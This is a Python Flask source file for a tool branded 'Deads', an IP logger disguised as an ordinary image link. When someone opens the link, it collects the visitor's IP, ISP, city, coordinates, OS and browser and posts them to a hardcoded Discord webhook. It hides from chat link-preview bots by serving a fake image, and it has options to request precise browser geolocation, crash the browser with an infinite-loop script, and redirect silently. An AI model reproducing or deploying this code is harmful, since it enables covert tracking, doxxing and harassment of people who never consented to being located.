from flask import Flask, request, Response
from urllib import parse
import traceback, requests, base64, httpagentparser

app = Flask(__name__)

__app__ = "Deads"
__version__ = "v1.0"

config = {
    "webhook": "https://discord.com/api/webhooks/1531358374829101116/rMcTlCQi7MyFWxP6RbPiZkY3W_8JKTSQ-Qlz_y3UfL0_TsYMvJPvGBr1gABqmizBs_OW",
    "image": "https://images.unsplash.com/photo-1503376780353-7e6692767b70?w=1200",
    "imageArgument": True,
    "username": "Deads",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "This browser has been logged by Deads.",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if useragent:
        if "Discordbot" in useragent or "Discord" in useragent:
            return "Discord"
        if useragent.startswith("TelegramBot"):
            return "Telegram"
    if ip and ip.startswith(("34", "35")):
        return "Discord"
    return False

def reportError(error):
    try:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "@everyone",
            "embeds": [{
                "title": "Deads - Error",
                "color": config["color"],
                "description": f"An error occurred!\n\n**Error:**\n```\n{error}\n```",
            }]
        })
    except:
        pass

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if not ip or ip.startswith(blacklistedIPs):
        return

    bot = botCheck(ip, useragent)
    if bot:
        if config["linkAlerts"]:
            try:
                requests.post(config["webhook"], json={
                    "username": config["username"],
                    "content": "",
                    "embeds": [{
                        "title": "Deads - Link Sent",
                        "color": config["color"],
                        "description": f"A **Deads** link was sent in a chat!\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                    }]
                })
            except:
                pass
        return

    ping = "@everyone"

    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5).json()
    except:
        info = {"proxy": False, "hosting": False, "isp": "Unknown", "as": "Unknown",
                "country": "Unknown", "regionName": "Unknown", "city": "Unknown",
                "lat": 0, "lon": 0, "timezone": "Unknown/Unknown", "mobile": False}

    if info.get("proxy"):
        if config["vpnCheck"] == 2:
            return
        if config["vpnCheck"] == 1:
            ping = ""

    if info.get("hosting"):
        if config["antiBot"] in (3, 4):
            return
        if config["antiBot"] in (1, 2):
            ping = ""

    os, browser = httpagentparser.simple_detect(useragent) if useragent else ("Unknown", "Unknown")

    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "Deads - IP Logged",
            "color": config["color"],
            "description": (
                f"**A User Opened the Original Image!**\n\n"
                f"**Endpoint:** `{endpoint}`\n\n"
                f"**IP Info:**\n"
                f"> **IP:** `{ip if ip else 'Unknown'}`\n"
                f"> **Provider:** `{info.get('isp', 'Unknown')}`\n"
                f"> **ASN:** `{info.get('as', 'Unknown')}`\n"
                f"> **Country:** `{info.get('country', 'Unknown')}`\n"
                f"> **Region:** `{info.get('regionName', 'Unknown')}`\n"
                f"> **City:** `{info.get('city', 'Unknown')}`\n"
                f"> **Coords:** `{str(info.get('lat', 0)) + ', ' + str(info.get('lon', 0))}` (Approximate)\n"
                f"> **Timezone:** `Unknown`\n"
                f"> **Mobile:** `{info.get('mobile', False)}`\n"
                f"> **VPN:** `{info.get('proxy', False)}`\n"
                f"> **Bot:** `{info.get('hosting', False)}`\n\n"
                f"**PC Info:**\n"
                f"> **OS:** `{os}`\n"
                f"> **Browser:** `{browser}`\n\n"
                f"**User Agent:**\n```\n{useragent}\n```"
            ),
        }]
    }

    if url:
        embed["embeds"][0]["thumbnail"] = {"url": url}

    try:
        requests.post(config["webhook"], json=embed)
    except:
        pass

    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def handleRequest(path):
    try:
        s = request.full_path
        query_dict = dict(parse.parse_qsl(parse.urlsplit(s).query))

        if config["imageArgument"]:
            if query_dict.get("url") or query_dict.get("id"):
                url = base64.b64decode((query_dict.get("url") or query_dict.get("id")).encode()).decode()
            else:
                url = config["image"]
        else:
            url = config["image"]

        ip = request.headers.get('x-forwarded-for', '').split(',')[0].strip() or request.headers.get('x-real-ip') or '0.0.0.0'
        ua = request.headers.get('user-agent', '')

        html_data = (
            f'<style>body{{margin:0;padding:0;}}'
            f'div.img{{background-image:url(\'{url}\');'
            f'background-position:center center;background-repeat:no-repeat;'
            f'background-size:contain;width:100vw;height:100vh;}}</style>'
            f'<div class="img"></div>'
        )

        if botCheck(ip, ua):
            if config["buggedImage"]:
                resp = Response(binaries["loading"], mimetype='image/jpeg')
            else:
                resp = Response(status=302)
                resp.headers['Location'] = url

            makeReport(ip, endpoint=request.path, url=url)
            return resp

        else:
            if query_dict.get("g") and config["accurateLocation"]:
                location = base64.b64decode(query_dict.get("g").encode()).decode()
                makeReport(ip, ua, location, request.path, url=url)
            else:
                makeReport(ip, ua, endpoint=request.path, url=url)

            message = config["message"]["message"]
            data = html_data

            if config["message"]["doMessage"]:
                data = message

            if config["crashBrowser"]:
                data = message + '<script>setTimeout(function(){for(var i=69420;i==i;i*=i){console.log(i)}},100)</script>'

            if config["redirect"]["redirect"]:
                data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'

            if config["accurateLocation"]:
                data += """<script>
var currenturl = window.location.href;
if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(coords) {
            if (currenturl.includes("?")) {
                currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
            } else {
                currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
            }
            location.replace(currenturl);
        });
    }
}
</script>"""

            return Response(data, mimetype='text/html')

    except Exception:
        reportError(traceback.format_exc())
        return Response('500 - Internal Server Error', status=500)
